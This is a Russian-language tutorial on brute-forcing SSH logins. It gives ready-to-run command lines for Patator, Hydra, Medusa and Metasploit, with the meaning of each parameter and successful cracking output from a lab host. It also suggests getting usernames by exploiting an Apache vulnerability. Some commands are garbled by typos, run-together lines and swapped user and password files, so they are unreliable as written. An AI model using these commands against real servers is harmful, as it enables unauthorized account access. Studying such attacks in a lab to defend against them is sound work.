# Brute-force SSH

[Что такое brute-force](materials/security/bruteforce.md)

Пусть у нас есть SSH-cepвep с IР-адресом `111.11.11.11` (адрес приводится исключительно для примера). Наша задача каким-то образом узнать имя пользователя, который зарегистрирован на сервере. Имя root пробовать не стоит, так как обычно его отключают для входа по SSH. Поэтому нужно как-то раздобыть другое имя пользователя. Как это сделать? Haпpимep, с помощью уязвимости в том же Apache. Можно также попробовать часто используемые имена вроде admin, test, user. Для брутфорса можно использовать следующие иструменты: `Patator`, `Medusa`, `Hydra`, `Metasploit`. Все они доступны в дистрибутиве Kali Linux.

# 1 Patator

Для подбора пароля средствами Patator используется команда:

```bash
patator ssh_login host=lll.11.11.11 user=test password=FIIEO O=/root/wordlist -х ignore:mesg='Authentication failed'
```

|**Параметр**|**Значение**|
|---|---|
|**`ssh_login`**|необходимый модуль|
|**`host`**|наша цель|
|**`user`**|логин пользователя, к которому подбирается пароль или файл с логинами для множественного подбора|
|**`password`**|словарь с паролями|
|**`-х ignore:mesg= 'Authentication failed'`**|команда не выводить на экран строку, имеющую данное сообщение. Параметр фильтрации подбирается индивидуально. То есть в зависимости от версии и настроек сервера, сообщение об неудачной аутентификации может быть другим|

## **Практика**

## 1.1 Запустим сервис ssh

![https://i.imgur.com/4GHAWBp.png](https://i.imgur.com/4GHAWBp.png)

## 1.2 Попробуем подключиться

Все успешно, так что попробуем сбрутить наш пароль от ssh

## 1.3 Для брутфорса нам потребуется файл с паролями, если вы хотите перебрать много паролей, то воспользуйтесь файлом с гита:

```bash
wget <https://github.com/duyet/bruteforce-database/blob/master/2151220-passwords.txt>
```

## 1.4 Мы создадим свои файлы, чтобы посмотреть на практике (включая верный пароль для аутентификации)

## 1.5 Будем использовать наш IP

## 1.6 В нашем случае воспользуемся командой:

```bash
patator ssh_login host=192.168.79.144 user=FILE0 password=FILE1 0=user_name.txt 1=passwords.txt -x ignore:mesg='Authentication failed'
```

Подобран верный пароль:

```bash
11:20:29 patator INFO - 0 33 0.035 | user:Kali123 | 23 | SSH-2.0-OpenSSH_9.0p1 Debian-1+b1
```

# **2. Hydra**

Для подбора пароля с помощью Hydra используется команда:

```bash
hydra -V -f -t 4 -1 test -Р /root/wordlist ssh://111.11.11.11
```

|**Параметр**|**Значение**|
|---|---|
|**`-V`**|показывать пару логин + пароль во время перебора|
|**`-f`**|остановка, как только будет найден пароль для указаного логина|
|**`-Р`**|путь до словаря с паролями|
|**`ssh://111.11.11.11`**|IР-адрес жертвы|

## **Практика**

В нашем случае воспользуемся командой:

```bash
hydra -V -f -t 4 -l user -P /home/user/passwords.txt ssh://192.168.79.144
```

Пароль успешно подобран.

```bash
[22][ssh] host: 192.168.79.144 login: user password: Kali123
```

# **3. Medusa**

Для подбора пароля с помощью Medusa используется команда:

```bash
medusa -h 192.168.60.50 -u test -Р /root/wordlist -М ssh -f -v 6
```

|**Параметр**|**Значение**|
|---|---|
|**`-h`**|IР-адрес жертвы|
|**`-u`**|Логин|
|**`-Р`**|Путь к словарю|
|**`-М`**|Выбор модуля|
|**`-f`**|Остановка после нахождения валидной пары логин/пароль|
|**`-v`**|Настройка отображения сообщений на экране во время процесса подбора|

## **Практика**

В нашем случае воспользуемся командой:

```bash
medusa -h 192.168.79.144 -u user -P passwords.txt -M ssh -f -v 6
```

Пароль успешно подобран.

```bash
ACCOUNT FOUND: [ssh] Host: 192.168.79.144 User: user Password: Kali123 [SUCCESS]
```

# **4. Metasploit**

## 4.1 Запустим metasploit: `msfconsole`

```bash
msfconsole
```

## 4.2 Найдем нужный инструмент: `search ssh_login`


## 4.3 Первый обеспечивает подбор логина и пароля, а второй - логина и публичного ключа.

Нас сейчас интересует первый модуль:

```bash
use auxiliary/scanner/ssh/ssh_login
```


## 4.4 Посмотрим необходимые параметры для заполнения:

```bash
show options
```

## 4.5 Заполним их нужными данными (каждый отдельной строкой)

```bash
set blank_passwords trueset stop_on_success trueset verbose trueset user_file password.txtset pass_file user_name.txtset rhosts 192.168.79.144
```

![https://i.imgur.com/HwniQQR.png](https://i.imgur.com/HwniQQR.png)

## 4.6 Запустим с помощью команды `use` или `exploit`

![https://i.imgur.com/c9AGKRM.png](https://i.imgur.com/c9AGKRM.png)

Пароль успешно подобран.

```bash
[+] 192.168.79.144:22 - Success: 'user:Kali123' 'uid=1000(user) gid=1000(user) группы=1000(user), 4(adm), 20(dialout), 24(cdrom), 25(floppy), 27(sudo), 29(audio), 30(dip), 44(video), 46(plugdev), 109(netdev), 119(wireshark), 121(bluetooth), 137(scanner), 141(kaboxer) Linux kali 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07) x86_64 GNU/Linux '
```
